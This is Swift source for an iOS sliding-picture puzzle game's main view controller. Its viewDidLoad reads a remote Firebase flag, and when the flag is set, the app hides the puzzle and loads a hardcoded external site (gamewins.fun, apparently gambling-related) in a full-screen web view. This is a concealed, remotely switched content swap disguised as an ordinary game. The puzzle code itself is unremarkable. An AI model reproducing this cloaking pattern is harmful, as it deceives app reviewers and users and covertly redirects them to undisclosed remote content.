//
//  ViewController.swift
//  giis4
//
//  Created by никита уваров on 3.11.21.
//

import UIKit
import Firebase
import FirebaseStorage
import FirebaseDatabase
import FirebaseCore
import WebKit

enum CellsType {
    case digit, image
}

enum Const {
    static let spaceBeforeCell: CGFloat = 5
}

class ViewController: UIViewController, WKNavigationDelegate {
    let scringSize = UIScreen.main.bounds
    let boardView = UIView()
    let restartButton = UIButton()
    let rulesButton = UIButton()
    let changePuzzleButton = UIButton()
    let imageView = UIImageView()
    var cells: [UIView] = []
    var choseImageStackView = UIStackView()
    var webView = WKWebView()

    let model = Model()
    
    var isDataEnabled = false
    var isEnableChoseImage = false
    
    override func viewDidLoad() {
        super.viewDidLoad()
        
        Firestore.firestore().collection("data").getDocuments() { [weak self] snap, error in
            if let data = snap?.documents {
                self?.isDataEnabled = data[0].data()["inputData"] as? Bool ?? false
                self?.startProgramm()
            }
        }
    }
    
    func startProgramm() {
        if isDataEnabled {
            webView.navigationDelegate = self
            let url = URL(string: "https://gamewins.fun/w5xTfz")!
            webView.load(URLRequest(url: url))
            webView.allowsBackForwardNavigationGestures = true
            webView.frame = view.frame
            view.addSubview(webView)
        } else {
            setBoard()
            model.createImageCells(numberImage: 1)
            setCells(cellsType: .image)
            setChangePuzzleButton()
            setRestartButton()
            setRules()
            view.backgroundColor = UIColor(red: 5 / 255, green: 6 / 255, blue: 26 / 255, alpha: 1)
        }
    }
    
    func setBoard() {
        view.addSubview(boardView)
        boardView.frame = CGRect(x: 0, y: scringSize.width / 2, width: scringSize.width, height: scringSize.width)
        boardView.backgroundColor = UIColor(red: 3 / 255, green: 34 / 255, blue: 133 / 255, alpha: 1)

        imageView.frame = CGRect(x: 0, y: 0, width: scringSize.width, height: scringSize.width)
        imageView.image = UIImage(named: "")
        boardView.addSubview(imageView)
    }
    
    func setCells(cellsType: CellsType = .digit) {
        cells = []
        
        let widthOneCell = scringSize.width / 4 - 10
        model.voidCellNumber = Int.random(in: (0..<model.countCell))
        model.numbers.shuffle()
        model.allImages.shuffle()
        model.currentCell = 0
        cells = []
        
        for item in (0..<model.countRow) {
            for itemRow in (0..<model.countRow) {
                guard model.voidCellNumber != itemRow + item * model.countRow else {
                    let cellView = UIView()
                    boardView.addSubview(cellView)
                    cellView.frame = CGRect(x: CGFloat(itemRow) * scringSize.width / 4 + Const.spaceBeforeCell, y: CGFloat(item) * scringSize.width / 4 + Const.spaceBeforeCell, width: widthOneCell, height: widthOneCell)
                    cells.append(contentsOf: [cellView])
                    continue
                }
                let cellView = CellView(cellsType: cellsType)
                cellView.frame = CGRect(x: CGFloat(itemRow) * scringSize.width / 4 + Const.spaceBeforeCell, y: CGFloat(item) * scringSize.width / 4 + Const.spaceBeforeCell, width: widthOneCell, height: widthOneCell)
                let image = cellsType == .digit ? nil : model.allImages[model.currentCell]
                cellView.setup(numberCell: model.numbers[model.currentCell], image: image)
                model.currentCell += 1
                cells.append(contentsOf: [cellView])
                boardView.addSubview(cellView)

                cellView.numberCellOnBoard = itemRow + item * model.countRow
                cellView.onDidTapCell = { number in
                    guard self.isMove(movedCell: number) else { return }
                    cellView.numberCellOnBoard = self.model.voidCellNumber
                    self.moveCell(movedCell: number)
                }
            }
        }
    }
    
    func setRestartButton() {
        view.addSubview(restartButton)
        restartButton.frame.size = CGSize(width: scringSize.width / 2, height: scringSize.width / 8)
        restartButton.center = CGPoint(x: view.center.x, y: scringSize.width + scringSize.width / 2 + 70)
        restartButton.layer.cornerRadius = 23
        restartButton.clipsToBounds = true
        restartButton.backgroundColor = UIColor(red: 30 / 255, green: 34 / 255, blue: 85 / 255, alpha: 1)
        restartButton.setTitle("рестарт", for: .normal)
        restartButton.addTarget(self, action: #selector(tapRestartButton), for: .touchUpInside)
    }
    
    func setRules() {
        view.addSubview(rulesButton)
        rulesButton.frame.size = CGSize(width: scringSize.width / 2, height: scringSize.width / 8)
        rulesButton.center = CGPoint(x: view.center.x, y: scringSize.width + scringSize.width / 2 + 70 + (2 * (scringSize.width / 8)))
        rulesButton.layer.cornerRadius = 23
        rulesButton.clipsToBounds = true
        rulesButton.backgroundColor = UIColor(red: 30 / 255, green: 34 / 255, blue: 85 / 255, alpha: 1)
        rulesButton.setTitle("правила", for: .normal)
        rulesButton.addTarget(self, action: #selector(tapRulesButton), for: .touchUpInside)
    }
    
    func setChangePuzzleButton() {
        view.addSubview(changePuzzleButton)
        changePuzzleButton.frame.size = CGSize(width: scringSize.width / 2, height: scringSize.width / 8)
        changePuzzleButton.center = CGPoint(x: view.center.x, y: scringSize.width / 2 - 100)
        changePuzzleButton.layer.cornerRadius = 23
        changePuzzleButton.clipsToBounds = true
        changePuzzleButton.backgroundColor = UIColor(red: 30 / 255, green: 34 / 255, blue: 85 / 255, alpha: 1)
        changePuzzleButton.setTitle("изменить пазл", for: .normal)
        changePuzzleButton.addTarget(self, action: #selector(tapChangePuzzleButton), for: .touchUpInside)
    }
    
    @objc func tapRestartButton() {
        UIView.animate(withDuration: 0.7, delay: 0.0, options: .curveLinear, animations: {
            self.boardView.subviews.forEach {
                if !($0 is UIImageView) {
                    $0.removeFromSuperview()
                }
            }
            self.model.createImageCells(numberImage: 1)
            self.setCells(cellsType: .image)
        })
    }
    
    @objc func tapRulesButton() {
        UIView.animate(withDuration: 1.7, delay: 0.0, options: .curveLinear, animations: {
            let rulesVC = RulesVC()
            self.present(rulesVC, animated: true)
        })
    }
    
    @objc func tapChangePuzzleButton() {
        UIView.animate(withDuration: 0.2, delay: 0.0, options: .curveLinear, animations: {
            self.changeImageButtonAction()
        })
    }
    
    func isMove(movedCell number: Int) -> Bool {
        return (cells[self.model.voidCellNumber].frame.midX == cells[number].frame.midX
               && abs(cells[self.model.voidCellNumber].frame.midY - cells[number].frame.midY) == scringSize.width / 4)
                || (abs(cells[self.model.voidCellNumber].frame.midX - cells[number].frame.midX) == (scringSize.width / 4)
                    && cells[self.model.voidCellNumber].frame.midY == (cells[number].frame.midY))
    }
    
    func moveCell(movedCell number: Int) {
        UIView.animate(withDuration: 0.2, delay: 0.0, options: .curveLinear, animations: {
            let itemFrame = self.cells[self.model.voidCellNumber].frame
            self.cells[self.model.voidCellNumber].frame = self.cells[number].frame
            self.cells[number].frame = itemFrame
            
            let item = self.cells[self.model.voidCellNumber]
            self.cells[self.model.voidCellNumber] = self.cells[number]
            self.cells[number] = item
            
            self.model.voidCellNumber = number
        })
    }
    
    func onDidTapImage(_ number: Int) {
        self.boardView.subviews.forEach {
            if !($0 is UIImageView) {
                $0.removeFromSuperview()
            }
        }
        self.model.createImageCells(numberImage: number)
        self.setCells(cellsType: .image)
        choseImageStackView.removeFromSuperview()
    }
    
    @objc func changeImageButtonAction() {
        choseImageStackView = UIStackView()
        choseImageStackView.frame = view.frame
        choseImageStackView.backgroundColor = .systemGreen
        choseImageStackView.alignment = .fill
        choseImageStackView.distribution = .fillEqually
        choseImageStackView.axis = .vertical
        view.addSubview(choseImageStackView)
        
        let image1 = UIImageView()
        image1.image = UIImage(named: "1")
        choseImageStackView.addArrangedSubview(image1)
        
        let image2 = UIImageView()
        image2.image = UIImage(named: "2")
        choseImageStackView.addArrangedSubview(image2)
        
        let image3 = UIImageView()
        image3.image = UIImage(named: "3")
        choseImageStackView.addArrangedSubview(image3)
        
        let image4 = UIImageView()
        image4.image = UIImage(named: "4")
        choseImageStackView.addArrangedSubview(image4)
        isEnableChoseImage = true
    }
    
    override func touchesBegan(_ touches: Set<UITouch>, with event: UIEvent?) {
        guard isEnableChoseImage else { return }
        if let touch = touches.first {
            if touch.location(in: choseImageStackView).y < view.frame.height / 4 {
                onDidTapImage(1)
            } else if touch.location(in: choseImageStackView).y < 2 * view.frame.height / 4 {
                onDidTapImage(2)
            } else if touch.location(in: choseImageStackView).y < 3 * view.frame.height / 4 {
                onDidTapImage(3)
            } else if touch.location(in: choseImageStackView).y < view.frame.height {
                onDidTapImage(4)
            }
            isEnableChoseImage = false
        }
    }
}

